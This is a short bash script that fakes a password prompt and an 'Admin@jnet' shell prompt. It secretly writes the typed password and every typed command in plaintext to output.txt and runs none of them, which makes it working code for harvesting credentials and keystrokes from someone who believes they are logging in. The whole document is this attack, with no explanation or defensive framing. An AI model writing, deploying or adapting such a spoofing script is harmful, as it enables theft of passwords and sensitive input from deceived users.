#!/bin/bash
#
#
#
output_file="output.txt"
srv="jnet"
u="Admin"
stty -echo
printf "Password: "
read ps
stty echo
printf "\n"
echo "Entered Password: $ps" >> $output_file
sed '/^$/d' $output_file > fixed.txt
mv fixed.txt output.txt

while true
do
    stty -echo
printf "$u@$srv:~"
    read Y
    echo "$Y" >> $output_file
    sed '/^$/d' $output_file > fixed.txt
    mv fixed.txt output.txt
done

